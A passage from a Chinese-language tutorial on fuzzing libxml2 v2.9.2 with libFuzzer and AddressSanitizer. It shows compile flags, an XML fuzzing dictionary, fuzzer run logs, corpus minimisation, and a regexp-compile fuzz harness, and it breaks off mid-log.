3526/672Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 142/1470 MS: 1 EraseBytes-#2487217 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 555/1470 MS: 1 EraseBytes-#2487243 REDUCE cov: 2019 ft: 9901 corp: 3527/673Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 1464/1470 MS: 1 CopyPart-#2487595 NEW cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2035 rss: 553Mb L: 1430/1470 MS: 4 ShuffleBytes-ChangeByte-ChangeBinInt-CopyPart-#2487978 REDUCE cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2035 rss: 553Mb L: 34/1470 MS: 2 ChangeBit-EraseBytes-#2487997 REDUCE cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 534/1470 MS: 1 EraseBytes-#2488103 REDUCE cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 62/1470 MS: 4 ChangeBit-PersAutoDict-ShuffleBytes-EraseBytes- DE: &quot;UT&quot;- 但迟迟没有crash。这可能有很多原因：1.程序很健壮。2.我们选择的接口函数不合适 3.异常检测的设置不当。这三个可能的原因中程序是否健壮我们不得而知，接口函数是否合适我们通过覆盖率了解到以xmlReadMemory作为入口函数执行到的代码块还是较高的，但也有可能因为漏洞不在接口函数的部分。第三个可能，由于异常检测的设置不当导致即使产生了异常但因为于设置的异常检测不匹配和没有捕获到。回头看下我们的santize设置为address开启内存错误检测器(AddressSanitizer)，该选项较为通用且宽泛(无非stack/heap_overflow)，但其实还有一些更具针对行的选项： 12345678910-fsanitize-address-field-padding=&lt;value&gt; Level of field padding for AddressSanitizer -fsanitize-address-globals-dead-stripping Enable linker dead stripping of globals in AddressSanitizer -fsanitize-address-poison-custom-array-cookie Enable poisoning array cookies when using custom operator new[] in AddressSanitizer -fsanitize-address-use-after-scope Enable use-after-scope detection in AddressSanitizer -fsanitize-address-use-odr-indicator Enable ODR indicator globals to avoid false ODR violation reports in partially sanitized programs at the cost of an increase in binary size 其中有一个-fsanitize-address-use-after-scope描述为开启use-after-scope检测，将其加入到编译选项中，再次编译。 1234567export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configuremake -j$(nproc)clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1 跑了一会儿依然没有收获，看来这将会是一个较长时间的过程。 123456789101112131415161718#1823774 REDUCE cov: 2019 ft: 9428 corp: 3417/499Kb lim: 1160 exec/s: 2867 rss: 546Mb L: 229/1150 MS: 4 ChangeBinInt-InsertByte-InsertByte-EraseBytes-#1823804 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2867 rss: 546Mb L: 508/1150 MS: 3 CopyPart-EraseBytes-CopyPart-#1824507 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2868 rss: 546Mb L: 24/1150 MS: 1 EraseBytes-#1824608 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2864 rss: 546Mb L: 474/1150 MS: 4 InsertRepeatedBytes-ChangeASCIIInt-PersAutoDict-CrossOver- DE: &quot;\\xff\\xff\\xffN&quot;-#1824748 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2864 rss: 546Mb L: 1066/1143 MS: 5 ChangeASCIIInt-CMP-PersAutoDict-ChangeBit-EraseBytes- DE: &quot;ISO-8859-1&quot;-&quot;\\xfe\\xff\\xff&quot;-#1825344 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2865 rss: 546Mb L: 25/1143 MS: 1 EraseBytes-#1825716 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2866 rss: 546Mb L: 437/1143 MS: 3 InsertRepeatedBytes-InsertRepeatedBytes-EraseBytes-#1825879 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2866 rss: 546Mb L: 73/1143 MS: 4 CMP-ChangeASCIIInt-ChangeBit-EraseBytes- DE: &quot;\\x01\\x00\\x00P&quot;-#1826898 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2863 rss: 546Mb L: 453/1143 MS: 3 ChangeByte-ChangeASCIIInt-EraseBytes-#1827221 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2863 rss: 546Mb L: 404/1143 MS: 1 EraseBytes-#1827788 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2864 rss: 546Mb L: 47/1143 MS: 1 EraseBytes-#1828282 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 112/1143 MS: 4 CMP-ChangeBit-ChangeByte-EraseBytes- DE: &quot;O&gt;/&lt;&quot;-#1828714 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 7/1143 MS: 1 EraseBytes-#1828728 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 163/1143 MS: 1 EraseBytes-#1828756 NEW cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 1155/1155 MS: 1 CopyPart-#1828812 REDUCE cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 42/1155 MS: 2 ChangeBit-EraseBytes-#1828952 REDUCE cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2862 rss: 546Mb L: 380/1155 MS: 1 EraseBytes-#1829111 REDUCE cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2862 rss: 546Mb L: 542/1155 MS: 3 InsertByte-ChangeASCIIInt-EraseBytes- 但我们不能放任其fuzz，要想一些办法去提高我们fuzz的效率，这其中一个办法就是使用字典。 我们知道基本上所有的程序都是处理的数据其格式是不同的，比如 xml文档， png图片等等。这些数据中会有一些特殊字符序列 （或者说关键字）， 比如在xml文档中就有CDATA，&lt;!ATTLIST等，png图片就有png 图片头。如果我们事先就把这些字符序列列举出来吗，fuzz直接使用这些关键字去组合，就会就可以减少很多没有意义的尝试，同时还有可能会走到更深的程序分支中去。这里whorkshop就提供了AFL中所使用的dict: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889//xml.dict➜ 08 git:(master) ✗ cat xml.dict # Copyright 2016 Google Inc.## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.################################################################################### AFL dictionary for XML# ----------------------## Several basic syntax elements and attributes, modeled on libxml2.## Created by Michal Zalewski &lt;lcamtuf@google.com&gt;#attr_encoding=&quot; encoding=\\&quot;1\\&quot;&quot;attr_generic=&quot; a=\\&quot;1\\&quot;&quot;attr_href=&quot; href=\\&quot;1\\&quot;&quot;attr_standalone=&quot; standalone=\\&quot;no\\&quot;&quot;attr_version=&quot; version=\\&quot;1\\&quot;&quot;attr_xml_base=&quot; xml:base=\\&quot;1\\&quot;&quot;attr_xml_id=&quot; xml:id=\\&quot;1\\&quot;&quot;attr_xml_lang=&quot; xml:lang=\\&quot;1\\&quot;&quot;attr_xml_space=&quot; xml:space=\\&quot;1\\&quot;&quot;attr_xmlns=&quot; xmlns=\\&quot;1\\&quot;&quot;entity_builtin=&quot;&amp;lt;&quot;entity_decimal=&quot;&amp;#1;&quot;entity_external=&quot;&amp;a;&quot;entity_hex=&quot;&amp;#x1;&quot;string_any=&quot;ANY&quot;string_brackets=&quot;[]&quot;string_cdata=&quot;CDATA&quot;string_col_fallback=&quot;:fallback&quot;string_col_generic=&quot;:a&quot;string_col_include=&quot;:include&quot;string_dashes=&quot;--&quot;string_empty=&quot;EMPTY&quot;string_empty_dblquotes=&quot;\\&quot;\\&quot;&quot;string_empty_quotes=&quot;''&quot;string_entities=&quot;ENTITIES&quot;string_entity=&quot;ENTITY&quot;string_fixed=&quot;#FIXED&quot;string_id=&quot;ID&quot;string_idref=&quot;IDREF&quot;string_idrefs=&quot;IDREFS&quot;string_implied=&quot;#IMPLIED&quot;string_nmtoken=&quot;NMTOKEN&quot;string_nmtokens=&quot;NMTOKENS&quot;string_notation=&quot;NOTATION&quot;string_parentheses=&quot;()&quot;string_pcdata=&quot;#PCDATA&quot;string_percent=&quot;%a&quot;string_public=&quot;PUBLIC&quot;string_required=&quot;#REQUIRED&quot;string_schema=&quot;:schema&quot;string_system=&quot;SYSTEM&quot;string_ucs4=&quot;UCS-4&quot;string_utf16=&quot;UTF-16&quot;string_utf8=&quot;UTF-8&quot;string_xmlns=&quot;xmlns:&quot;tag_attlist=&quot;&lt;!ATTLIST&quot;tag_cdata=&quot;&lt;![CDATA[&quot;tag_close=&quot;&lt;/a&gt;&quot;tag_doctype=&quot;&lt;!DOCTYPE&quot;tag_element=&quot;&lt;!ELEMENT&quot;tag_entity=&quot;&lt;!ENTITY&quot;tag_ignore=&quot;&lt;![IGNORE[&quot;tag_include=&quot;&lt;![INCLUDE[&quot;tag_notation=&quot;&lt;!NOTATION&quot;tag_open=&quot;&lt;a&gt;&quot;tag_open_close=&quot;&lt;a /&gt;&quot;tag_open_exclamation=&quot;&lt;!&quot;tag_open_q=&quot;&lt;?&quot;tag_sq2_close=&quot;]]&gt;&quot;tag_xml_q=&quot;&lt;?xml?&gt;&quot; 其中关键字就是””里的内容，libfuzzer会使用这些关键字进行组合来生成样本。字典使用方法./libxml2-v2.9.2-fsanitize_fuzzer1 -max_total_time=60 -print_final_stats=1 -dict=./xml.dict corpus1执行结果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168#468074 REDUCE cov: 2521 ft: 8272 corp: 2493/82Kb lim: 135 exec/s: 7801 rss: 452Mb L: 105/135 MS: 4 InsertRepeatedBytes-CMP-CopyPart-CrossOver- DE: &quot;\\x01\\x00\\x00\\x00&quot;-#468322 REDUCE cov: 2521 ft: 8272 corp: 2493/82Kb lim: 135 exec/s: 7805 rss: 452Mb L: 85/135 MS: 3 CopyPart-CopyPart-EraseBytes-#468381 REDUCE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7806 rss: 452Mb L: 74/135 MS: 1 InsertByte-#468390 REDUCE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7806 rss: 452Mb L: 66/135 MS: 2 ChangeASCIIInt-EraseBytes-#468391 REDUCE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7806 rss: 452Mb L: 89/135 MS: 1 EraseBytes-#468575 DONE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7681 rss: 452Mb###### Recommended dictionary. ######&quot;\\x08\\x00&quot; # Uses: 366&quot;Q\\x00&quot; # Uses: 370&quot;\\x00:&quot; # Uses: 325&quot;\\x97\\x00&quot; # Uses: 301&quot;\\x0d\\x00&quot; # Uses: 335&quot;\\xfe\\xff\\xff\\xff&quot; # Uses: 273&quot;UCS-&quot; # Uses: 294&quot;\\x15\\x00&quot; # Uses: 277&quot;\\x00\\x00&quot; # Uses: 289&quot;\\xff\\xff\\xff\\x1c&quot; # Uses: 258&quot;\\xff\\xff\\xff!&quot; # Uses: 257&quot;\\xff\\xff\\xff\\x01&quot; # Uses: 250&quot;UTF-1&quot; # Uses: 250&quot;\\xff\\xff\\xffN&quot; # Uses: 236&quot;UTF-16LE&quot; # Uses: 223&quot;ISO-10&quot; # Uses: 228&quot;ISO-1064&quot; # Uses: 256&quot;\\x0a\\x00\\x00\\x00&quot; # Uses: 246&quot;Q\\x00\\x00\\x00&quot; # Uses: 247&quot;\\xf1\\x1f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 212&quot;$\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 194&quot;\\xff\\xff\\xff\\x0e&quot; # Uses: 211&quot;\\x09\\x00&quot; # Uses: 226&quot;\\x01\\x00\\x00\\xfa&quot; # Uses: 212&quot;\\x01\\x00\\x00\\x02&quot; # Uses: 239&quot;\\xac\\x0f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 206&quot;\\xffO&quot; # Uses: 263&quot;\\xff\\x03&quot; # Uses: 235&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x10&quot; # Uses: 200&quot;\\xf4\\x01\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 203&quot;UTF-16BE&quot; # Uses: 188&quot;\\x00\\x00\\x00P&quot; # Uses: 207&quot;\\x0a\\x00&quot; # Uses: 196&quot;\\xff\\xff&quot; # Uses: 203&quot;\\xff\\xff\\xff\\xff\\xff\\x97\\x96\\x80&quot; # Uses: 186&quot;\\x01 \\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 187&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00$&quot; # Uses: 156&quot;P\\x00&quot; # Uses: 186&quot;\\xff\\xff\\xff\\xff&quot; # Uses: 197&quot;\\xff\\xff\\xff\\x09&quot; # Uses: 202&quot;\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 204&quot;\\x01\\x01&quot; # Uses: 170&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x10&quot; # Uses: 197&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x03&quot; # Uses: 183&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 174&quot;\\xff\\x05&quot; # Uses: 198&quot;US-ASCII&quot; # Uses: 214&quot;\\x01\\x00&quot; # Uses: 201&quot;xlmns&quot; # Uses: 189&quot;\\xff\\xff\\xff\\x14&quot; # Uses: 191&quot;xmlsn&quot; # Uses: 179&quot;\\x00\\x00\\x00\\x03&quot; # Uses: 201&quot;xmlns&quot; # Uses: 182&quot;\\xaf\\x0f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 186&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\x0e\\xb9&quot; # Uses: 176&quot;\\xff\\x09&quot; # Uses: 178&quot;ISO-1&quot; # Uses: 191&quot;la&quot; # Uses: 157&quot;\\x01\\x00\\x00\\x00&quot; # Uses: 173&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x14&quot; # Uses: 172&quot;\\xff\\xff\\xff\\x7f\\x00\\x00\\x00\\x00&quot; # Uses: 164&quot;\\x00\\x00\\x00\\x04&quot; # Uses: 154&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 153&quot;\\x00\\x00\\x00\\x02&quot; # Uses: 136&quot;\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 140&quot;ISO-10646-&quot; # Uses: 146&quot;id&quot; # Uses: 155&quot;\\x00\\x01&quot; # Uses: 145&quot;\\x00\\x02&quot; # Uses: 140&quot;\\x01\\x00\\x00\\x08&quot; # Uses: 165&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e&quot; # Uses: 136&quot;\\xff\\xff\\xff\\xff~\\xff\\xff\\xff&quot; # Uses: 130&quot;\\x81\\x96\\x98\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 150&quot;\\x03\\x00\\x00\\x00&quot; # Uses: 116&quot;\\x18\\x00\\x00\\x00&quot; # Uses: 176&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf9&quot; # Uses: 124&quot;%\\x17\\x8f[&quot; # Uses: 130&quot;\\x0e\\x00\\x00\\x00&quot; # Uses: 142&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xfa&quot; # Uses: 96&quot;\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 116&quot;\\x00\\x04&quot; # Uses: 161&quot;\\x00\\x00\\x00\\x0b&quot; # Uses: 119&quot;\\x00\\x00\\x00\\x06&quot; # Uses: 141&quot;annnn\\xd4nnnnnn&quot; # Uses: 100&quot;\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 106&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x17&quot; # Uses: 114&quot;\\x16\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 122&quot;\\x0f\\x00&quot; # Uses: 121&quot;inlc0a&quot; # Uses: 128&quot;\\x01\\x00\\x00O&quot; # Uses: 101&quot;\\x01\\x04&quot; # Uses: 117&quot;\\x01P&quot; # Uses: 122&quot;\\xfb\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 95&quot;\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 107&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03&quot; # Uses: 98&quot;\\x00#&quot; # Uses: 102&quot;\\x00\\x00\\x00\\x0d&quot; # Uses: 92&quot;ISO-8859-1&quot; # Uses: 100&quot;\\xff\\xf9&quot; # Uses: 77&quot;\\xf7\\x0f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 79&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfb&quot; # Uses: 82&quot;\\x01\\x0b&quot; # Uses: 101&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\x0e\\xff&quot; # Uses: 78&quot;&gt;&lt;&gt;\\xb7&quot; # Uses: 81&quot;&lt;b&quot; # Uses: 81&quot;UTF-8\\x00&quot; # Uses: 76&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x09&quot; # Uses: 63&quot;#\\x00\\x00\\x00&quot; # Uses: 75&quot;S\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 73&quot;a\\xff&quot; # Uses: 70&quot;TIONb&quot; # Uses: 46&quot;\\x01\\x00\\x00?&quot; # Uses: 69&quot;!\\x00\\x00\\x00&quot; # Uses: 67&quot;\\x00\\x00\\x00\\x01&quot; # Uses: 74&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\x1f\\x02&quot; # Uses: 57&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x16&quot; # Uses: 57&quot;-\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 53&quot;\\x01\\x00\\x00\\x05&quot; # Uses: 65&quot;:b&quot; # Uses: 67&quot;\\x17\\x1c_&gt;&quot; # Uses: 63&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x18&quot; # Uses: 64&quot;\\x00\\x00\\x00'&quot; # Uses: 45&quot;\\x00\\x00\\x00\\x05&quot; # Uses: 52&quot;\\xff\\xff\\xff\\x0d&quot; # Uses: 51&quot;US-AS&quot; # Uses: 48&quot;a&gt;&quot; # Uses: 53&quot;C\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 44&quot;\\xff\\xff\\x00\\x00&quot; # Uses: 36&quot;\\x01\\x07&quot; # Uses: 49&quot;@\\x00\\x00\\x00&quot; # Uses: 46&quot;\\x02\\x00&quot; # Uses: 32&quot;+\\x00&quot; # Uses: 37&quot;\\x00\\x00\\x00\\x00\\x00\\x00 \\x02&quot; # Uses: 42&quot;\\x00\\x0f&quot; # Uses: 37&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff$&quot; # Uses: 49&quot;ASCII&quot; # Uses: 40&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00&quot; # Uses: 30&quot;a\\xff:-\\xec&quot; # Uses: 27&quot;\\xff\\x1a&quot; # Uses: 30&quot;'''''''''&amp;''&quot; # Uses: 23&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x1d&quot; # Uses: 34&quot;TIOIb&quot; # Uses: 19&quot;J\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 15&quot;N\\x00\\x00\\x00&quot; # Uses: 10&quot;\\x01O&quot; # Uses: 8&quot;\\xff\\xff\\xff\\x02&quot; # Uses: 6&quot;HTML&quot; # Uses: 8&quot;\\x00P&quot; # Uses: 9&quot;\\xff\\xff\\xff\\x00&quot; # Uses: 9&quot;\\xff\\x06&quot; # Uses: 9&quot;\\x7f\\x96\\x98\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 4&quot;^&gt;&lt;b&gt;&quot; # Uses: 5&quot;\\x01\\x0a&quot; # Uses: 5&quot;\\x13\\x00&quot; # Uses: 1###### End of recommended dictionary. ######Done 479244 runs in 61 second(s)stat::number_of_executed_units: 479244stat::average_exec_per_sec: 7856stat::new_units_added: 5007stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 467 可以看到最后还给出了Recommended dictionary，可以更新到我们的.dict中。stat::new_units_added: 4709说明最终探测到了5007个代码单元。不使用字典的话： 123456Done 402774 runs in 61 second(s)stat::number_of_executed_units: 402774stat::average_exec_per_sec: 6602stat::new_units_added: 3761stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 453 可以看到使用字典效率确实提高不少。 此外，当我们长时间fuzz时，会产生和编译出很多样本，这些样本存放在语料库corpus中，例如上面就产生了➜ 08 git:(master) ✗ ls -lR| grep &quot;^-&quot; | wc -l 7217 7217个样本，其中很多是重复的，我们可以通过以下方法进行精简(使用-merge=1标志)： 123456789101112131415161718192021222324252627282930313233mkdir corpus1_mincorpus1_min: 精简后的样本集存放的位置corpus1: 原始样本集存放的位置➜ 08 git:(master) ✗ ./libxml2-v2.9.2-fsanitize_fuzzer1 -merge=1 corpus1_min corpus1INFO: Seed: 1264856731INFO: Loaded 1 modules (53343 inline 8-bit counters): 53343 [0xd27740, 0xd3479f), INFO: Loaded 1 PC tables (53343 PCs): 53343 [0x9b3650,0xa83c40), MERGE-OUTER: 2724 files, 0 in the initial corpusMERGE-OUTER: attempt 1INFO: Seed: 1264900516INFO: Loaded 1 modules (53343 inline 8-bit counters): 53343 [0xd27740, 0xd3479f), INFO: Loaded 1 PC tables (53343 PCs): 53343 [0x9b3650,0xa83c40), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytesMERGE-INNER: using the control file '/tmp/libFuzzerTemp.8187.txt'MERGE-INNER: 2724 total files; 0 processed earlier; will process 2724 files now#1 pulse cov: 464 exec/s: 0 rss: 32Mb#2 pulse cov: 470 exec/s: 0 rss: 33Mb#4 pulse cov: 502 exec/s: 0 rss: 33Mb#8 pulse cov: 522 exec/s: 0 rss: 34Mb#16 pulse cov: 533 exec/s: 0 rss: 34Mb#32 pulse cov: 681 exec/s: 0 rss: 35Mb#64 pulse cov: 756 exec/s: 0 rss: 36Mb#128 pulse cov: 1077 exec/s: 0 rss: 39Mb#256 pulse cov: 1247 exec/s: 0 rss: 45Mb#512 pulse cov: 1553 exec/s: 0 rss: 55Mb#1024 pulse cov: 2166 exec/s: 0 rss: 77Mb#2048 pulse cov: 2550 exec/s: 2048 rss: 120Mb#2724 DONE cov: 2666 exec/s: 2724 rss: 155MbMERGE-OUTER: succesfull in 1 attempt(s)MERGE-OUTER: the control file has 287194 bytesMERGE-OUTER: consumed 0Mb (38Mb rss) to parse the control fileMERGE-OUTER: 2313 new files with 8750 new features added; 2666 new coverage edges 精简到了2313个样本。 workshop还提供了另一个fuzz target: 123456789101112131415161718192021222324252627282930313233➜ 08 git:(master) ✗ cat xml_compile_regexp_fuzzer.cc // Copyright 2016 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;algorithm&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &quot;libxml/parser.h&quot;#include &quot;libxml/tree.h&quot;#include &quot;libxml/xmlversion.h&quot;void ignore (void * ctx, const char * msg, ...) { // Error handler to avoid spam of error messages from libxml parser.}// Entry point for LibFuzzer.extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { xmlSetGenericErrorFunc(NULL, &amp;ignore); std::vector&lt;uint8_t&gt; buffer(size + 1, 0); std::copy(data, data + size, buffer.data()); xmlRegexpPtr x = xmlRegexpCompile(buffer.data()); if (x) xmlRegFreeRegexp(x); return 0;} 与之前的不同，将输入的数据copy到buffer中，再交给xmlRegexpCompile处理。编译运行如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152➜ 08 git:(master) ✗ clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++11 xml_compile_regexp_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1 ➜ 08 git:(master) ✗ ./libxml2-v2.9.2-fsanitize_fuzzer1 -dict=./xml.dictDictionary: 60 entriesINFO: Seed: 2400921417INFO: Loaded 1 modules (53352 inline 8-bit counters): 53352 [0xd27700, 0xd34768), INFO: Loaded 1 PC tables (53352 PCs): 53352 [0x9b36f0,0xa83d70), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 114 ft: 115 corp: 1/1b exec/s: 0 rss: 30Mb NEW_FUNC[1/5]: 0x551cf0 in ignore(void*, char const*, ...) /home/admin/libfuzzer-workshop/lessons/08/xml_compile_regexp_fuzzer.cc:16 NEW_FUNC[2/5]: 0x552d00 in __xmlRaiseError /home/admin/libfuzzer-workshop/lessons/08/libxml2/error.c:461#6 NEW cov: 150 ft: 169 corp: 2/2b lim: 4 exec/s: 0 rss: 31Mb L: 1/1 MS: 3 ShuffleBytes-ShuffleBytes-ChangeByte-#10 NEW cov: 155 ft: 223 corp: 3/4b lim: 4 exec/s: 0 rss: 31Mb L: 2/2 MS: 4 ChangeBit-ShuffleBytes-ShuffleBytes-InsertByte-#12 NEW cov: 156 ft: 277 corp: 4/8b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 ShuffleBytes-CopyPart-#13 NEW cov: 161 ft: 282 corp: 5/12b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 CrossOver-#20 NEW cov: 175 ft: 302 corp: 6/14b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 2 ChangeByte-ChangeBinInt-#24 NEW cov: 177 ft: 305 corp: 7/16b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 4 EraseBytes-ChangeBinInt-ChangeBit-InsertByte- NEW_FUNC[1/1]: 0x604f00 in xmlFAReduceEpsilonTransitions /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:1777#28 NEW cov: 206 ft: 336 corp: 8/19b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 4 ShuffleBytes-ChangeByte-ChangeBit-CMP- DE: &quot;\\x01?&quot;-#32 NEW cov: 209 ft: 343 corp: 9/21b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 4 ManualDict-ShuffleBytes-ShuffleBytes-ChangeBit- DE: &quot;&lt;!&quot;-#38 NEW cov: 210 ft: 344 corp: 10/25b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 ChangeByte-#45 NEW cov: 210 ft: 347 corp: 11/29b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 CopyPart-ChangeByte-#47 NEW cov: 211 ft: 366 corp: 12/33b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 CopyPart-ChangeBinInt-#50 NEW cov: 211 ft: 367 corp: 13/37b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 3 ChangeBinInt-CopyPart-ChangeBinInt-#57 NEW cov: 211 ft: 388 corp: 14/40b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 2 ManualDict-CrossOver- DE: &quot;\\&quot;\\&quot;&quot;- NEW_FUNC[1/1]: 0x606d20 in xmlFARecurseDeterminism /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:2589#64 NEW cov: 233 ft: 421 corp: 15/43b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 2 ChangeBit-PersAutoDict- DE: &quot;\\x01?&quot;-#66 NEW cov: 235 ft: 426 corp: 16/47b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 EraseBytes-PersAutoDict- DE: &quot;\\x01?&quot;-#68 REDUCE cov: 235 ft: 426 corp: 16/46b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 2 ChangeBit-EraseBytes-#72 NEW cov: 236 ft: 427 corp: 17/50b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 4 